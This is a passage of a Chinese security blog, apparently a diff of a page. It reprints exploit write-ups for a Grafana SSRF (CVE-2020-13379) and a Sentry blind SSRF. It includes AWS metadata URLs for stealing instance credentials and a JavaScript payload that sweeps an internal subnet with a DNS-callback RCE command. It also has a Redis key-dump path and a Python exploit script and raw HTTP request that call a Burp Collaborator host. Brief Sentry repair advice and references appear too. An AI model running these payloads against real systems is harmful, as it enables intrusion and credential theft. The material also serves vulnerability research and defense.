-<p>通过AWS公开的元数据服务器访问链接<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/user-data%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BB%8E%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9B%AE%E6%A0%87%E5%AE%9E%E4%BE%8B%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BE%88%E5%A4%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%99%BD%E7%84%B6[AWS%E6%96%87%E6%A1%A3](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)%E4%B8%80%E5%86%8D%E5%A3%B0%E7%A7%B0%E4%B8%8D%E8%A6%81%E5%9C%A8%E8%AF%A5%E5%AE%9E%E4%BE%8B%E4%BD%8D%E7%BD%AE%E5%AD%98%E5%82%A8%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E4%BB%A5%E7%BB%8F%E9%AA%8C%E6%9D%A5%E7%9C%8B%EF%BC%8C%E4%B9%8B%E5%89%8D%E6%88%91%E8%BF%98%E6%98%AF%E4%BB%8E%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%8E%B7%E5%8F%96%E4%BA%86%E5%A4%A7%E9%87%8FK8S">http://169.254.169.254/latest/user-data，我们可以从中获取到目标实例相关的很多敏感信息，虽然[AWS文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)一再声称不要在该实例位置存储凭证信息，但以经验来看，之前我还是从中发现获取了大量K8S</a> Secrets、IAM Credentials、SSL Certificates、GitHub Credentials等密钥数据。<br>另外，我们还能从另外一个AWS路径中获取有用信息：</p>
-<p><code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>
-</blockquote>
-<h3><span id="漏洞利用2-图片渲染过程导致的blind-ssrf">漏洞利用2-图片渲染过程导致的Blind SSRF</span></h3><blockquote>
-<p>Grafana实例内部会发生大量的图片渲染过程，因此攻击者可以向其中以Headless Chrome实例方式（非Chrome环境中运行Chrome），构造包含超时变量的HTML页面，以此为据点，实施长期的内网RCE攻击尝试。</p>
-<p>同样，我们利用CVE-2020-13379的SSRF漏洞，还能执行内网端口扫描探测，比如，在Grafana的通用实例中会有一个3001端口，用该SSRF方法可以成功探测到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 22</span><br><span class="line">ETag: W/&quot;16-NipK4Bud1bhsozqKdmj9bWnwGTg&quot;</span><br><span class="line">Date: Wed, 29 Jul 2020 11:21:31 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Grafana Image Renderer</span><br></pre></td></tr></table></figure>
-
-<p>基于此，攻击者可以精心构造，让Grafana实例系统通过以下链接执行危险操作：</p>
-<p><code>localhost:3001/render?url=http://yourhost&amp;domain=a&amp;renderKey=a&amp;timeout=30</code></p>
-<p>这里，我编写了以下HTML文件进行一个自动化快速的漏洞利用，用它可以进行RCE提权攻击。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">postData</span>(<span class="params">url = <span class="string">&#x27;&#x27;</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">postData</span>(<span class="string">&#x27;http://10.0.0.&#x27;</span>+i+<span class="string">&#x27;/oneshotrce&#x27;</span>, &#123; <span class="attr">cmd</span>: <span class="string">&#x27;dig dnscallback.com&#x27;</span> &#125;)</span><br><span class="line">&#125;               </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="漏洞利用3-操控gitlab的-prometheus-redis导出器">漏洞利用3-操控Gitlab的 Prometheus Redis导出器</span></h3><blockquote>
-<p>Prometheus 是一个开源的服务监控系统和时间序列数据库。之前我们已经提到过，该漏洞还会对版本&lt;13.1.1的Grafana Gitlab实例产生影响。根据Gitlab说明文档介绍，Grafana Gitlab实例 9.0版本开始，其Prometheus和导出器（Exporter）都是默认开启的，恰巧这些导出器可以成为攻击者利用CVE-2020-13379的突破口，其中一个导出器即是Redis Exporter，其路径为**<a href="http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=%5C***%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8target%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0%EF%BC%8C%E9%80%9A%E8%BF%87%E8%AF%A5%E8%B7%AF%E5%BE%84%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BDredis%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E3%80%82">http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=\***，攻击者利用target参数构造，通过该路径可以下载redis服务器中的所有密钥信息。</a></p>
-</blockquote>
-<h3><span id="漏洞利用4-image-only-ssrf-gt-full-read-ssrf">漏洞利用4- Image-Only SSRF -&gt; Full-Read SSRF</span></h3><blockquote>
-<p>在Grafana**<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115">开源文件avatar.go的第104行</a>**中，其对该SSRF响应内容类型（Content Type）为image&#x2F;jpeg，这就给了我们基于该SSRF漏洞，综合利用其它漏洞的独特机会。假设我们有以下场景：<code>example.com/fetchImage.php?image=http://localhost/image.png</code></p>
-<p>其fetchImage.php中的代码向请求目标发送了一个HTTP请求，然后会检查其内容类型（Content Type）是否为image&#x2F;jpeg，如果是就返回请求内容。因此，如果某个内部Grafana实例存在我们这里的CVE-2020-13379漏洞，那么攻击者可以构造以下链接形成一个内容读取型的SSRF漏洞攻击：<code>example.com/fetchImage.php?image=http://internalgrafana/avatar/.../169.254.169.254</code></p>
-<p>由于返回内容需要是image&#x2F;jpeg，因此它会执行一个content-type验证。另外，因为这是一个图像方式SSRF触发的读取型SSRF，而且攻击者可以控制其中的链接跳转，所以，攻击者还可把它用于文件扩展名检查欺骗。</p>
-</blockquote>
-<h2><span id="总结">总结</span></h2><blockquote>
-<p>该漏洞发现其实并不复杂，有意思的是Grafana内部HTTP请求发生时，读取 :hash时的参数注入问题，但无论如何，其漏洞影响非常严重，且其漏洞利用非常稳定有效。以下是我的几点心得：</p>
-<p>1、在源码检查时，首先去考虑未授权路径，其次是授权绕过；</p>
-<p>2、如果在开源应用中发现了某些有意思的功能，那相对于“黑盒测试”来说，可以针对该功能花心思测试测试，至少你能以开源方式获取更多数据，并能把你的“漏洞嗅觉”派上用场；</p>
-<p>3、针对0-day漏洞的挖掘可能会激发你的动力；</p>
-<p>4、有些公司不会为他们的0-day漏洞买单，</p>
-<p>5、自己发现漏洞后，可以和值得依赖的朋友分享，让他们也帮助看看是否能进行更深入的漏洞利用；</p>
-<p>6、这是我的一个漏洞报告模板工具，欢迎参考-<a target="_blank" rel="noopener" href="https://github.com/rhynorater/reports">https://github.com/rhynorater/reports</a></p>
-</blockquote>
-<h2><span id="参考来源">参考来源</span></h2><p><a target="_blank" rel="noopener" href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">rhynorater</a></p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/Sentry-SSRF/">
-                Sentry SSRF
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
-</blockquote>
-<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
-<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
-</blockquote>
-<h2><span id="exp-testing">exp testing</span></h2><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
-
-<p>然后去你到dnslog看看有没有请求记录即可。</p>
-<p>exp源码参考：<br>配置如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>],<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Non-Error exception captured with keys: code, details, message&quot;</span>,<span class="string">&quot;stacktrace&quot;</span>:&#123;<span class="string">&quot;frames&quot;</span>:[&#123;<span class="string">&quot;colno&quot;</span>:<span class="number">218121</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;http://&quot;</span>+collaborator,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;lineno&quot;</span>:<span class="number">1</span>&#125;]&#125;,<span class="string">&quot;exception&quot;</span>:&#123;<span class="string">&quot;values&quot;</span>:[&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Custom Object&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Error&quot;</span>&#125;]&#125;,<span class="string">&quot;event_id&quot;</span>:<span class="string">&quot;d0513ec5a3544e05aef0d1c7c5b24bae&quot;</span>,<span class="string">&quot;platform&quot;</span>:<span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;sdk&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sentry.javascript.browser&quot;</span>,<span class="string">&quot;packages&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;npm:@sentry/browser&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;],<span class="string">&quot;version&quot;</span>:<span class="string">&quot;4.6.4&quot;</span>&#125;,<span class="string">&quot;release&quot;</span>:<span class="string">&quot;6225dd99&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;phash&quot;</span>:<span class="string">&quot;996a3f4661e02cb505ae0daf406555e9b914f9d43d635c52cfc7485046862a7f&quot;</span>&#125;,<span class="string">&quot;breadcrumbs&quot;</span>:[&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="number">1554226659.455</span>,<span class="string">&quot;category&quot;</span>:<span class="string">&quot;navigation&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="string">&quot;/login&quot;</span>&#125;&#125;]&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://z.tochka.com/&#x27;</span>&#125;</span><br><span class="line">    rsp = requests.post(url, json=datas, headers=headers)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="to-build-blind-http-pack">To Build blind http pack</span></h2><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/1/store/?sentry_version=7&amp;sentry_client=raven-js%2f3.15.0&amp;sentry_key=【your</span> key】 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 【your <span class="string">target</span> url】.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line">Origin:【随意domain】</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk">&#123;<span class="comment">&quot;project&quot;</span>:<span class="comment">&quot;30&quot;</span>,<span class="comment">&quot;logger&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;platform&quot;</span>:<span class="comment">&quot;javascript&quot;</span>,<span class="comment">&quot;exception&quot;</span>:&#123;<span class="comment">&quot;values&quot;</span>:[&#123;<span class="comment">&quot;type&quot;</span>:<span class="comment">&quot;Error&quot;</span>,<span class="comment">&quot;value&quot;</span>:<span class="comment">&quot;Trying to get control scope but angular isn&#x27;t ready yet or something like this&quot;</span>,<span class="comment">&quot;stacktrace&quot;</span>:&#123;<span class="comment">&quot;frames&quot;</span>:[&#123;<span class="comment">&quot;filename&quot;</span>:<span class="comment">&quot;http://【your dnslog】&quot;</span>,<span class="comment">&quot;lineno&quot;</span>:<span class="number">110</span>,<span class="comment">&quot;colno&quot;</span>:<span class="number">81071</span>,<span class="comment">&quot;function&quot;</span>:<span class="comment">&quot;XMLHttpRequest.o&quot;</span>,<span class="comment">&quot;in_app&quot;</span>:<span class="keyword">true</span>&#125;]&#125;&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Sentry-SSRF/1.png" alt="image"></p>
-<p>sentry_version &#x3D; 红线2 （报错可以手动修改几个其他版本试试）<br>sentry_key &#x3D; Raven.config 红线1<br>origin &#x3D; 可以随便写</p>
-</blockquote>
-<h2><span id="repair">Repair</span></h2><blockquote>
-<p>1、sentry关闭 source code scrapping；<br>2、保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</p>
-</blockquote>
-<h2><span id="reference">Reference</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a><br><a target="_blank" rel="noopener" href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a><a class="tag-none-link" href="/tags/Sentry/" rel="tag">Sentry</a>
             </div>
         
 
